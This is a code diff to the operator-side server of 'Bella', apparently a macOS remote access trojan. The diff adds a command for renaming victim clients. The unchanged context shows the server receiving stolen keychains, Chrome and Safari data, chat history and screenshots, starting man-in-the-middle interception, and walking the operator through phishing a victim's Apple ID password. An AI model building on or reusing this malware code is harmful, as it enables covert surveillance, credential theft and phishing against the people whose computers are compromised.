@@ -29,7 +29,7 @@ redX = "%s[x] %s" % (red, endC)
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 
-commands = ['iCloud_query', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'set_client_name', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -322,17 +322,17 @@ def main():
                             os.makedirs(client_log_path)
                         first_run = False
 
-                elif data.startswith('cwdcwd')==True:
+                elif data.startswith('cwdcwd'):
                     sdoof = data.splitlines()
                     workingdir = sdoof[0][6:]
                     file_list = map(str.lower, sdoof[1:]) + sdoof[1:] + commands
                     string_log(workingdir + '\n', client_log_path, client_name)
 
-                elif data.startswith('downloader')==True:
+                elif data.startswith('downloader'):
                     (fileContent, file_name) = pickle.loads(data[10:])
                     downloader(fileContent, file_name, client_log_path, client_name)
 
-                elif data.startswith("mitmReady")==True:
+                elif data.startswith("mitmReady"):
                     os.system("osascript >/dev/null <<EOF\n\
                             tell application \"Terminal\"\n\
                             do script \"mitmproxy -p 8081 --cadir %s\"\n\
@@ -340,13 +340,13 @@ def main():
                             EOF" % helperpath)
                     print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'
 
-                elif data.startswith('keychain_download')==True:
+                elif data.startswith('keychain_download'):
                     keychains = pickle.loads(data[17:])
                     for x in keychains:
                         (keychainName, keychainData) = pickle.loads(x) #[keychainName, keychainData]
                         downloader(keychainData, keychainName, client_log_path, client_name, 'Keychains')
 
-                elif data.startswith('appleIDPhishHelp') == True:
+                elif data.startswith('appleIDPhishHelp'):
                     content = pickle.loads(data[16:])
                     if len(content[0]) > 0:
                         print "%sFound the following iCloud accounts.\n%s\nWhich would you like to use to phish current GUI user [%s]?" % (bluePlus, content[0], content[1])
@@ -362,7 +362,7 @@ def main():
                         print "Phishing [%s%s%s]" % (blue, username, endC)
                         nextcmd = "iCloudPhishFinal%s:%s" % (username, content[1])
 
-                elif data.startswith('screenCapture')==True:
+                elif data.startswith('screenCapture'):
                     screen = data[13:]
                     if screen == "error":
                         print "%sError capturing screenshot!" % redX
@@ -374,27 +374,33 @@ def main():
                         time.sleep(1)
                         print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
 
-                elif data.startswith('C5EBDE1F')==True:
+                elif data.startswith('C5EBDE1F'):
                     deserialize = pickle.loads(data[8:])
                     for x in deserialize:
                         (name, data) = x #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
                     print "%sGot macOS Chat History" % greenCheck
 
-                elif data.startswith('6E87CF0B')==True:
+                elif data.startswith('6E87CF0B'):
                     deserialize = pickle.loads(data[8:])
                     for x in deserialize:
                         (name, data) = x #name will be the user, which we're going to want on the path
                         downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
                     print "%sGot Safari History" % greenCheck
 
-                elif data.startswith('lserlser')==True:
+                elif data.startswith('lserlser'):
                     (rawfile_list, filePrint) = pickle.loads(data[8:]) 
                     widths = [max(map(len, col)) for col in zip(*filePrint)]
                     for fileItem in filePrint:
                         line = "  ".join((val.ljust(width) for val, width in zip(fileItem, widths))) #does pretty print
                         print line
                         string_log(line, client_log_path, client_name)
+               
+                elif data.startswith('updated_client_name'):
+                    computername = data.split(":::")[1]
+                    client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
+                    print data.split(":::")[2],
+
                 else:
                     if len(data) == 0:
                         sys.stdout.write('')
@@ -499,6 +505,9 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
+                    if nextcmd == "set_client_name":
+                        nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
+
                     if nextcmd == "disableKM":
                         print "[1] Keyboard | [2] Mouse"
                         device = raw_input("Which device would you like to disable? ")
@@ -557,6 +566,10 @@ def main():
                     if nextcmd == "vnc":
                         if platform.system() == 'Linux':
                             print '%sThere is not yet Linux support for a reverse VNC connection.' % redX
+                            #"wget https://www.realvnc.com/download/file/vnc.files/VNC-6.0.2-Linux-x64-ANY.tar.gz"
+                            #tar -zxvf VNCfiles
+                            #mv VNCfiles Payloads/
+                            #fork process
                             nextcmd = ''
                         else:
                             vnc_port = 5500
